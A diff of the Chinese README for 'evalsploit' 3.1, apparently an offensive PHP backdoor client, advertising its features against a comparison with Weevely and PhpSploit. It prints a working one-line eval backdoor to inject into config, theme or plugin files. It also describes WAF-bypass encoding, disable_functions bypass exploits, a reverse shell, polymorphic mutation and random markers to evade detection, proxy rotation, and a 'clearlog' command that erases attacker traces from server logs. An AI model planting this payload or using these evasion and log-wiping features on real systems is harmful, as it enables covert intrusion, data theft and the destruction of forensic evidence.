@@ -1,15 +1,100 @@
-# evalsploit 3.0
+# evalsploit 3.1
 
-基于 **eval 的 PHP 后门客户端**，用于红队与渗透测试。在禁用 `exec()` 和 shell 的受限环境中运行：所有文件操作仅使用 PHP 内置函数（fopen、DirectoryIterator、copy、unlink 等）。
+> 基于 eval 的 PHP 后门客户端，用于红队与渗透测试。
+> 在其他工具失效的地方照常工作 —— 没有 exec，没有 shell，没有问题。
 
-- **单行载荷** - 可注入受感染 PHP 文件的任何执行位置，或作为独立 shell 使用。
-- **会话文件** - 保存和加载连接（URL + 密钥 Z、V），便于快速重连。
-- **变异** - 在受感染文件中将后门行替换为新的多态载荷，并切换客户端到新密钥。
-- **静默模式** - 连接时不请求标识（pwd、ping），在首次命令前保持最少流量。
-- **代理** - host:port 列表、校验、每会话一个代理（随机或按序号），无需返回菜单即可切换。
-- **插件** - 无需修改核心即可添加自定义命令（见「插件」一节）。
+**文档语言：** [English](README.md) | [Русский](README_RU.md) | **中文**
 
-**文档语言：** [Русский (主要)](README_RU.md) | [English](README.md) | **中文**
+---
+
+## 为什么选择 evalsploit
+
+大多数 PHP 后门客户端假设你可以运行系统命令。而现实目标很少配合 —— `exec()`、`system()`、`shell_exec()` 等函数经常通过 `disable_functions` 被禁用。PHP 加固在共享主机、托管 WordPress 和注重安全的技术栈中十分常见。
+
+evalsploit 正是为这类环境而生。所有文件操作仅使用 PHP 内置函数：`fopen`、`fread`、`fwrite`、`DirectoryIterator`、`copy`、`unlink`、`rename`。SQL 控制台使用 PDO。grep 和 find 使用 `RecursiveIteratorIterator`。无需 shell。
+
+---
+
+## 核心亮点
+
+### 单行载荷，注入任意位置
+
+```php
+if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
+```
+
+一行代码。放入任何可执行的 PHP 文件 —— 配置文件、主题文件、插件钩子。也可作为独立 shell 使用。触发键 `Z` 和噪声分隔符 `V` 可按会话配置。
+
+### 兼容 PHP 8
+
+Weevely 使用 `create_function`，该函数已在 PHP 8.0 中移除。evalsploit 在 PHP 5.6 至 8.x 上无需任何修改即可运行。
+
+### 无 exec、无 shell —— 依然完全控制文件系统
+
+所有文件操作通过 PHP 内置函数完成。即使在所有 exec 变体均被封锁的加固环境中，你仍可完整读写文件系统、列目录、递归搜索、下载、上传、就地编辑。
+
+### 多态变异 —— 无需重新上传即可更换密钥
+
+`mutate` 生成带有新随机密钥的后门，发送 PHP 将服务器上的后门行就地覆写，并将客户端切换到新密钥 —— 一条命令完成全部操作。无需重新上传，无需手动修改。
+
+### 分块下载，支持大文件
+
+标准后门客户端将整个文件读入 PHP 内存（受 `memory_limit` 限制，通常为 128 MB）。evalsploit 的分块下载使用 `fseek`/`fread` 通过多个请求以 1 MB 的块传输文件，并显示实时进度条：
+
+```
+  45.0 MB / 512.0 MB (8%)
+```
+
+切换方式：`set download chunked` / `set download dl`。
+
+### 每次请求随机响应标记
+
+后门输出在每次请求时都用随机生成的标记包裹。没有静态字符串可供 WAF 指纹识别或日志关联。每次请求看起来都不同。
+
+### 3 种发送模式，内置 WAF 绕过
+
+| 模式 | 工作原理 |
+|------|---------|
+| **bypass** | 载荷 base64 编码后分拆到两个 POST 参数（Z + 噪声分隔符 V），服务端重组。破坏模式匹配过滤器。 |
+| **classic** | 完整 base64 载荷放在参数 Z 中。 |
+| **simple** | 原始 PHP 放在参数 Z 中。用于调试或防护较弱的目标。 |
+
+连接时自动检测：尝试所有模式，保存可用的那个。
+
+### SQL 控制台 —— MySQL 和 PostgreSQL，无需独立插件
+
+`sql user:pass@host/db` —— 一条命令通过 PDO 覆盖 MySQL 和 PostgreSQL。交互式 REPL，ASCII 表格在服务端格式化输出，`USE dbname` 无需额外请求即可处理。DSN 自动保存到会话。
+
+### 递归 grep 和 find —— 无需 exec
+
+```
+grep -i "password" /var/www
+find \.php$ /var/www/uploads
+```
+
+两者均在内部使用 PHP 迭代器。不需要 `grep` 或 `find` 可执行文件。
+
+### 清除痕迹 —— clearlog
+
+```
+clearlog detect                              <- 查找所有可访问的日志文件，显示 [rw]/[r-] 状态
+clearlog all /shell.php                      <- 从所有可写日志中删除匹配模式的行
+clearlog /var/log/nginx/access.log 1.2.3.4   <- 单个文件，指定模式
+```
+
+默认模式为会话配置中的 URL 路径。
+
+### 绕过 disable_functions —— 利用代码以数据形式传输
+
+当文件操作还不够用时，`exploit` 将 PHP 利用代码（存储在本地 `exploits/` 中）直接通过后门的 eval 通道发送。覆盖 PHP 7.0 至 8.5。无需文件上传 —— 利用代码以 eval 数据形式到达。
+
+### 插件 —— 无需修改核心即可扩展
+
+在 `evalsploit/plugins/` 中放一个 `.py` 文件，使用 `@register("cmdname")`，下次运行时该命令即出现在会话中。核心文件无需改动。
+
+### 代理轮换与实时验证
+
+加载 `host:port` 代理列表，验证（通过每个代理进行实时 GET），每个会话使用随机或固定代理。无需重新连接即可在会话中切换代理。
 
 ---
 
@@ -22,7 +107,7 @@ pip install -e .
 pip install -r requirements.txt
 ```
 
-数据（会话、设置、useragents）存放在 `data/` 下。如需要可将 `evalsploit-main/useragents` 复制到 `data/useragents`。
+数据（会话、设置、useragents）存放在 `data/` 目录。
 
 ---
 
@@ -34,76 +119,80 @@ python -m evalsploit
 evalsploit
 ```
 
-启动时可：输入**会话名**（来自 `data/sessions/`）、输入**新 URL**，或留空以使用 `data/settings.ini` 中的上次连接。
+启动菜单：输入**会话名**、**新 URL**，或按 Enter 使用上次的连接。
 
 ---
 
 ## 载荷
 
-将载荷作为任意执行 PHP 代码中的单行使用，或作为独立文件：
+单行，注入任意可执行 PHP：
 
 ```php
 if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
 ```
 
-更改发送模式或使用自定义参数名后，运行 **gen** 获取对应载荷（并在会话或设置中使用相同的 Z、V）。
+更改发送模式或参数名后，运行 `gen` 获取对应载荷。
 
 ---
 
-## 发送模式 (send)
+## 发送模式
 
-| 模式       | 说明 |
-|------------|------|
-| **bypass** | 载荷 base64 编码，用分隔符分块；参数 Z 和 V。可绕过部分 WAF/过滤。 |
-| **classic** | 载荷 base64 放在参数 Z 中。 |
-| **simple**  | 原始 PHP 放在参数 Z 中（无标记解析，用于调试）。 |
+| 模式 | 说明 |
+|------|------|
+| **bypass** | base64 载荷用分隔符分拆到两个参数 Z 和 V。可绕过部分 WAF。 |
+| **classic** | base64 载荷放在参数 Z 中。 |
+| **simple** | 原始 PHP 放在参数 Z 中。无标记解析 —— 用于调试。 |
 
-连接时（若未开启 **silent**）客户端会依次尝试各模式并保存可用者。手动设置：`set send bypass|classic|simple`。
+连接时自动检测。手动设置：`set send bypass|classic|simple`。
 
 ---
 
 ## 命令
 
-支持路径中含空格：两条路径时使用分隔符 ` : `（cp、ren/mv、带远程路径的 upload）。
+支持路径中含空格。两条路径时使用 ` : ` 作为分隔符（`cp`、`ren`/`mv`、带远程路径的 `upload`）。
 
-| 命令       | 说明 |
-|------------|------|
-| **ls**, **dir** | 列出目录（样式：`set ls ls` 或 `set ls dir`） |
-| **cd**, **pwd**, **home** | 切换目录、显示当前路径、转到 __DIR__ |
-| **cat**    | 显示文件（样式：`set cat bcat` / `set cat cat`） |
-| **cp**     | 复制：`cp <源> : <目标>`（分隔符 ` : `；两路径可含空格） |
-| **rm**, **del** | 删除文件：`rm <path>` 或 `del <path>`（set confirm 1 时需确认） |
+| 命令 | 说明 |
+|------|------|
+| **ls**, **dir** | 列出目录（`set ls ls` 或 `set ls dir`） |
+| **cd**, **pwd**, **home** | 切换目录 / 显示当前路径 / 转到 `__DIR__` |
+| **cat** | 显示文件（`set cat bcat` / `set cat cat`） |
+| **cp** | 复制：`cp <源> : <目标>` |
+| **rm**, **del** | 删除（`set confirm 1` 时需确认） |
 | **ren**, **mv** | 重命名/移动：`ren <旧> : <新>` |
-| **download**, **get**, **dl** | 从服务器下载：`download <远程路径>` 或 `download <远程路径> : <本地路径>`（无第二参数则保存到 data/downloads；带 ` : ` 则保存到指定文件或目录；路径可含空格） |
-| **upload**, **put**, **upl** | 上传：`upload <本地路径>` 或 `upload <本地路径> : <远程路径>`（可选远程路径用 ` : `；两路径可含空格） |
+| **download**, **get**, **dl** | 下载：`download <remote>` 或 `download <remote> : <local>`。支持分块模式（`set download chunked`）用于大文件，显示进度条。 |
+| **upload**, **put**, **upl** | 上传：`upload <local>` 或 `upload <local> : <remote>` |
 | **mkdir**, **mkd**, **md** | 创建目录 |
 | **create**, **mkf** | 创建空文件 |
-| **touch**, **stat** | 更新时间/创建空文件；文件/目录信息 |
-| **edit**   | 下载 → 本地编辑 → 上传 |
-| **run**    | Shell 模式（exec/shell_exec/…）- 输入 `exit` 退出 |
-| **exploit** | 绕过 disable_functions（如 7.3–8.1） |
-| **scan**   | 递归扫描，报告在 report/ |
+| **touch**, **stat** | 更新时间戳 / 文件信息 |
+| **edit** | 下载 -> 本地编辑 -> 上传 |
+| **grep** | 递归搜索文件内容：`grep [-i] <模式> [路径]`（PHP 正则） |
+| **find** | 递归搜索文件名：`find <模式> [路径]`（PHP 正则，忽略大小写） |
+| **clearlog** | 从日志文件删除匹配行：`clearlog detect` / `clearlog <path> [pattern]` / `clearlog all [pattern]`；默认模式为配置中的 URL 路径 |
+| **run** | 交互式 shell（exec/shell_exec/...）—— `exit` 退出 |
+| **php** | 交互式 PHP 控制台 —— 向服务器发送原始 PHP |
+| **exploit** | 绕过 disable_functions（PHP 7.0–8.5） |
+| **try**, **detect** | 检查可用的 exec 变体：`try run` |
 | **reverse** | 反向 shell：`reverse <主机>:<端口>` |
-| **set**    | 设置：`set <模块> <值>` 或 `set <模块> help`（含 set proxy 0/1） |
-| **proxy_switch** | 更换当前代理：无参数（新随机）、N（第 N 个）、random |
-| **gen**, **generate** | 为当前 send 模式及 Z、V 生成载荷 |
-| **mutate** | 在服务器上用新多态载荷替换后门行；更新本地 Z、V |
-| **sessions**, **saved** | 已保存会话列表 |
-| **save** \<名称\> | 将当前连接保存为会话 |
-| **connect** \<名称\> | 切换到已保存会话 |
-| **config** | 显示当前设置 |
-| **info**   | 服务器信息（PHP、OS 等） |
+| **sql** | SQL 控制台（PDO/MySQL/PostgreSQL）：`sql [user:pass@host[:port][/db]]`；连接成功后自动保存 DSN；`exit` 退出 |
+| **scan** | 递归扫描，报告保存到 `report/` |
+| **info** | 服务器信息：PHP 版本、OS、用户、`disable_functions`、`open_basedir` |
 | **ping**, **check** | 连通性与延迟检测 |
-| **php**    | PHP 控制台：输入代码并发送到服务器 |
-| **try**, **detect** | 检查可用执行方式（如 `try run`） |
-| **menu**   | 返回主启动菜单（当前会话结束；会提示确认） |
-| **help**, **exit** | 帮助；退出（退出程序前会提示确认） |
+| **gen**, **generate** | 显示当前 Z/V 和发送模式的载荷变体 |
+| **mutate** | 用新多态载荷覆写服务器上的后门；更新本地 Z/V |
+| **set** | 设置：`set <模块> <值>` 或 `set <模块> help` |
+| **proxy_switch** | 切换代理：无参数（随机）、N（第 N 个）、random |
+| **config** | 显示当前设置 |
+| **sessions**, **saved** | 已保存会话列表 |
+| **save \<名称\>** | 将当前连接保存为会话 |
+| **connect \<名称\>** | 加载并切换到已保存会话 |
+| **menu** | 返回启动菜单（结束当前会话） |
+| **help**, **exit** | 帮助 / 退出（均提示确认） |
 
 ---
 
 ## 会话文件
 
-存放在 `data/sessions/`，格式为 \<名称\>.ini：
+存放在 `data/sessions/<名称>.ini`：
 
 ```ini
 [SESSION]
@@ -114,56 +203,71 @@ send_mode = bypass
 silent = 0
 ```
 
-URL 和密钥（Z、V）必填。**save \<名称\>** 创建会话；**connect \<名称\>** 加载。**silent** 会写入会话文件，加载会话时生效。
+`save <名称>` 创建会话。`connect <名称>` 加载。`silent` 存储在会话文件中。
 
 ---
 
-## 静默模式 (silent)
+## 静默模式
 
-**set silent 1** 时，连接阶段不执行：
-- 当前目录请求（pwd）；
-- 后门可达性检测（ping）及发送模式回退。
+`set silent 1` —— 连接时跳过初始 `pwd` 请求和发送模式检测。第一条命令即第一次请求。用于最小化流量特征。
 
-命令照常发送；可用 **pwd** 或 **cwd**（插件）获取当前路径。用于在运行命令前最小化流量。设置会保存到全局配置和会话文件。
+全局保存，同时保存在会话文件中。
 
 ---
 
-## 代理 (Proxies)
+## 代理
 
-**启动菜单**中选项 **5. 代理** - 子菜单：从文件加载列表（`data/proxies.txt` 或自定义路径）、校验每个代理（经代理 GET）、带 OK 状态的列表、启用/禁用、选择模式 - **random**（默认；每会话一个随机代理）或按序号。列表保存在 `data/proxies.txt`（一行一个 `host:port`，空行和 `#` 行忽略）。校验通过的序号仅保存在内存中，重启后需重新校验。
+启动菜单 -> **5. 代理**：从文件加载列表（`data/proxies.txt`，每行一个 `host:port`），验证（通过每个代理进行实时 GET），启用随机或固定模式。
 
-**连接后：** **set proxy 0** - 关闭，**set proxy 1** - 开启。**set proxy show** - 显示校验过的代理并按编号选择。**set proxy switch** - 另选一个随机代理（排除当前）。**set proxy switch N** - 切换到第 N 个代理。**set proxy switch random** - random 模式，下次请求用新随机代理。也可使用 **proxy_switch**（别名）。所选代理用于所有请求直至切换或关闭。
+会话内操作：
+- `set proxy 0` / `set proxy 1` —— 禁用/启用
+- `set proxy show` —— 列出已验证代理，按编号选择
+- `set proxy switch` —— 切换到另一个随机代理
+- `set proxy switch N` —— 切换到第 N 个代理
+- `proxy_switch` —— 别名
 
 ---
 
-## 设置 (set)
+## 设置（set）
 
-- **set run** - run 使用的 shell 函数（exec、shell_exec、system、passthru、popen、proc_open、expect_popen、pcntl_exec、do）。
-- **set ls** / **set cat** - 列表与读取样式（选项见 snippets.ini）。
-- **set send** - 发送模式：bypass、classic、simple。
-- **set silent** - 0 或 1。
-- **set reverse** - 反向 shell 类型：ivan、monkey。
-- **set confirm** - 危险操作（rm、upl、edit）前确认：0 或 1。
-- **set rm**, **set del**, **set download**, **set upload**, **set rename**, **set stat**, **set touch**, **set create**, **set mkdir**, **set cp** - 各命令的代码片段选择（键来自 snippets.ini）。别名（dl、get、upl、put、mkf、mkd、md、ren、mv）均可使用。
+| 设置 | 可选值 |
+|------|--------|
+| `set send` | `bypass`, `classic`, `simple` |
+| `set run` | `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `expect_popen`, `pcntl_exec`, `do` |
+| `set ls` / `set cat` | 片段键（见 `snippets.ini`） |
+| `set download` | `dl`（默认），`chunked`（大文件，显示进度条） |
+| `set silent` | `0`, `1` |
+| `set confirm` | `0`, `1` —— rm/upload/edit 前确认 |
+| `set reverse` | `ivan`, `monkey` |
+| `set grep` / `set find` | 片段键 |
+| `set rm`, `set upload`, `set rename`, `set stat`, `set touch`, `set create`, `set mkdir`, `set cp` | 片段键（接受别名） |
+
+`set <设置> help` 列出可用值。SQL DSN 在成功连接后自动保存。
+
+---
+
+## 代码片段（Snippets）
+
+文件命令使用 `evalsploit/modules/snippets/` 中的 PHP 片段，在 `snippets.ini` 中建立索引。切换变体：`set <命令> <键>`。无效的键在加载时重置并给出警告。
+
+值得注意的变体：
+- `set download chunked` —— 每请求 1 MB 的分块下载，有进度条，不受 PHP memory_limit 限制
+- `set ls dir` —— Windows 风格的目录列表
+- `set cat bcat` —— 二进制安全的文件读取
+
+---
+
+## 变异（Mutation）
+
+`mutate` 生成新的多态后门（新 Z、V），发送 PHP 在目标文件中定位含 `isset($_POST['Z'])` 的行，用新后门替换，并写回文件。客户端更新密钥。其他后门实例保留旧密钥。
 
 ---
 
 ## 插件
 
-插件在不修改 evalsploit 核心的情况下增加新命令。
+在 `evalsploit/plugins/` 中放一个 `.py` 文件。以 `_` 开头的文件会被跳过。
 
-### 工作原理
-
-启动时 evalsploit 加载 `evalsploit/plugins/` 下所有 `*.py`（以 `_` 开头的文件跳过）。每个插件须用 `@register` 注册命令，并实现继承 `Module` 的类及 `run(ctx, args)` 方法。
-
-- **ctx**（SessionContext）：`ctx.send(php)` 向服务器发送 PHP，`ctx.config`、`ctx.pwd`、`ctx.resolve_path(path)`、`ctx.file_exists(path)`、`ctx.url`、`ctx.uagent` 等。
-- **args** - 用户输入中命令名后的全部内容（参数解析在插件内完成）。
-
-可在 `@register` 中可选传入 **description** 和 **usage**，会出现在 **help** 中。
-
-### 最简插件示例
-
-创建 `evalsploit/plugins/mycmd.py`：
+最简示例（`evalsploit/plugins/mycmd.py`）：
 
 ```python
 from evalsploit.modules.registry import register
@@ -172,90 +276,67 @@ from evalsploit.modules.base import Module
 @register("mycmd", description="简短说明", usage="mycmd [path]")
 class MyCmdModule(Module):
     def run(self, ctx, args):
-        path = ctx.resolve_path(args.strip()) if args.strip() else ctx.pwd
-        php = "echo getcwd();"
-        print(ctx.send(php).strip())
+        print(ctx.send("echo getcwd();").strip())
         return None
 ```
 
-下次运行后，**mycmd** 会出现在命令列表和 **help** 中。
+`ctx.send(php)` —— 向服务器发送 PHP 并获取输出。
+`ctx.resolve_path(path)` —— 相对于当前 pwd 解析路径。
+`php_quote(s)` —— 转义字符串用于 PHP 单引号字面量。
+`confirm_dangerous(ctx, action, detail)` —— 执行破坏性操作前提示确认。
 
-### 建议
-
-- 一个文件对应一条命令（命令名在 `@register` 中指定）。
-- 导入：`register` 来自 `evalsploit.modules.registry`，`Module` 来自 `evalsploit.modules.base`。在 PHP 字符串中嵌入路径时使用 `evalsploit.modules.base` 的 `php_quote()`。
-- 处理异常并输出用户可读信息；避免未捕获崩溃。
-- 危险操作可使用 `evalsploit.modules.base` 的 `confirm_dangerous(ctx, action, detail)`。
-
-更多见 [evalsploit/plugins/README.md](evalsploit/plugins/README.md) 及示例 `example_echo.py`、`example_cwd.py`。
-
----
-
-## 代码片段 (Snippets)
-
-文件类命令（ls、cat、rm、dl、upload、touch、stat 等）使用 `evalsploit/modules/snippets/` 中的 PHP 片段。索引在 `snippets.ini`。用 **set** \<命令\> \<键\> 选择变体。settings.ini 中的键在加载时校验；无效键会重置并输出 stderr 警告。
-
----
-
-## 变异 (Mutation)
-
-**mutate** 生成新的多态后门（新 Z、V），发送 PHP 读取当前脚本，找到当前触发行（`isset($_POST['Z'])`），替换为新后门并写回文件。客户端更新其 Z、V。其他后门副本（其他 URL）仍使用旧密钥，直至手动更新或在该处执行 mutate。
+更多内容见 `evalsploit/plugins/README.md` 和 `example_cwd.py`。
 
 ---
 
 ## 架构
 
-- **config** - 全局设置、会话加载/保存、片段键校验。
-- **context** - URL、pwd、user-agent、`send(php)`、路径辅助（`resolve_path`、`file_exists`）。
-- **transport** - 载荷编码（bypass/classic/simple）、POST、按标记解析响应（标记前输出被忽略）。
-- **payloads** - 单行、多态后门、变异用 PHP。
-- **modules** - 每条命令为已注册模块；文件操作使用 `evalsploit/modules/snippets/` 中的片段。
-
-添加核心模块：实现 `run(ctx, args)`，使用 `@register("cmdname")`，如需则在 `snippets/` 添加片段。向片段代入路径时使用 `php_quote(value)`。
-
----
-
-## 更新说明（相对早期 evalsploit）
-
-### 新增与改进
-
-- **menu** - 从会话循环返回主启动菜单；会提示确认，当前会话显式结束。**exit** 现在也会在退出进程前请求确认。
-- **命令名与别名** - 更直观的主名与向后兼容别名：
-  - **mkdir**（别名：mkd、md）- 创建目录  
-  - **create**（别名：mkf）- 创建空文件  
-  - **download**（别名：get、dl）- 从服务器下载；可选 `download <远程> : <本地>` 保存到指定文件或目录（无第二参数则保存到 data/downloads）。  
-  - **upload**（别名：put、upl）- 上传；可选远程路径用分隔符 ` : `  
-  - **ren**（别名：mv）- 重命名/移动  
-  - **gen**（别名：generate）、**try**（别名：detect）、**rm**（别名：del）
-- **路径含空格** - 双路径命令使用 ` : ` 分隔（cp、ren/mv、upload）。单路径命令（download、get、dl、rm、cat、cd 等）整行视为一条路径，支持空格。**upload** 改为用 ` : ` 表示可选远程路径，以便两路径均可含空格。
-- **帮助 (usage)** - HELP_TEXTS 与应用内 help 已标明正确用法，如 `cp <from> : <to>`、`download <remote_path>`、`upload <local_path> [ : <remote_path>]`。
-- **set** - 接受所有新名称与别名用于片段选择（mkdir、create、download、upload、del、ren、mv 等）。
-
-### 不兼容/行为变更
-
-- **upload** - 两条路径必须用 ` : ` 分隔。旧写法 `upload <本地> <远程>`（两词用空格）不再支持；请用 `upload <本地> : <远程>` 以支持路径含空格。
-- **exit** - 退出程序前需确认（y/yes）；EOF（如 Ctrl+Z/D）仍会直接退出且不提示。
+```
+evalsploit/
+├── cli.py              — 启动菜单、会话循环、help
+├── config.py           — 设置、会话加载/保存、片段键验证
+├── context.py          — SessionContext：url、pwd、send()、路径辅助方法
+├── transport/
+│   ├── send.py         — HTTP POST、载荷编码、按标记解析响应
+│   └── payloads.py     — 多态后门生成、变异用 PHP
+├── modules/
+│   ├── registry.py     — @register 装饰器、COMMANDS/COMMAND_HELP 字典
+│   ├── base.py         — Module 基类、片段加载器、php_quote、substitute
+│   ├── snippets/       — PHP 模板（ls、cat、dl、grep、find、sql...）
+│   └── file/ set/ ...  — 命令模块
+└── plugins/            — 用户插件（启动时自动加载）
+exploits/               — PHP disable_functions 绕过载荷（通过 eval 通道发送）
+data/                   — settings.ini、sessions/、proxies.txt、downloads/
+```
 
 ---
 
 ## 与同类工具对比
 
+### 功能矩阵
+
+| 功能 | evalsploit | Weevely 3 | PhpSploit |
+|------|------------|-----------|-----------|
+| 兼容 PHP 8 | **是** | 否（`create_function` 已移除） | 是 |
+| 无需 exec/shell | **是**（仅 PHP 内置） | 部分 | 部分 |
+| 每请求随机标记 | **是** | 否（静态 MD5 标记） | 否 |
+| 多态变异 | **是**（服务端就地覆写） | 否 | 否 |
+| 静默模式 | **是** | 否 | 否 |
+| 3 种发送模式（bypass/classic/simple） | **是** | 否 | 否 |
+| SQL 控制台 | **是**（PDO，MySQL+PostgreSQL） | 是（mysqli/pg_*） | 是（每种 DBMS 独立插件） |
+| 无需 exec 的递归 grep/find | **是** | 部分 | 否 |
+| 分块下载（大文件） | **是**（1 MB/请求，显示进度） | 否 | 否 |
+| 清除痕迹（clearlog） | **是**（插件） | 是 | 是 |
+| 绕过 disable_functions | **是**（PHP 7.0–8.5） | 是 | 是 |
+| 插件系统 | **是**（单个 .py 文件） | 是 | 是 |
+
 ### Weevely
 
-Weevely 使用自有载荷格式与协议（referrer/cookie、加密）。evalsploit 采用单一简单 eval 单行、服务器端痕迹最小，可配置密钥（Z、V）与发送模式（bypass/classic/simple），就地变异（替换一行），文件操作仅用 PHP 内置（无需 exec/shell）。Python 插件可增加命令而无需重新构建。
+Weevely 使用 XOR+gzip+base64 传输，每次部署的静态 MD5 标记使每个实例均可被识别。依赖 `create_function` 进行混淆 —— 该函数在 PHP 8.0 中已移除。evalsploit 每次请求使用随机标记，在 PHP 5.6–8.x 上均可运行，且文件操作无需 exec。
 
 ### PhpSploit
 
-PhpSploit 为完整 C2 框架，基于 HTTP 头隧道与大量插件。evalsploit 侧重简洁：单行 eval、POST 参数（Z、V）、响应标记便于调试。会话为普通 .ini（url、Z、V、send_mode、silent）。静默模式减少连接时流量。片段键在加载时校验。插件集中于一目录，扩展功能无需改动核心。
-
-### evalsploit 的优势
-
-- 载荷极小 - 单行 eval，易于注入。
-- 无需 exec/shell - 仅用 PHP 内置（适合 disable_functions）。
-- 密钥与发送模式灵活，就地变异。
-- 会话与静默模式便于快速重连与低特征。
-- 插件 - 在 plugins/ 中一个 .py 即可新增命令。
-- 架构简单 - 便于调试与扩展。
+PhpSploit 是完整的 C2 框架，采用基于 HTTP 头的隧道传输，拥有插件系统，并为每种数据库提供独立的 SQL 模块。evalsploit 通过 PDO 的单条 `sql` 命令覆盖 MySQL 和 PostgreSQL。会话为简单的 `.ini` 文件。PhpSploit 没有静默模式和多态变异功能。
 
 ---
 
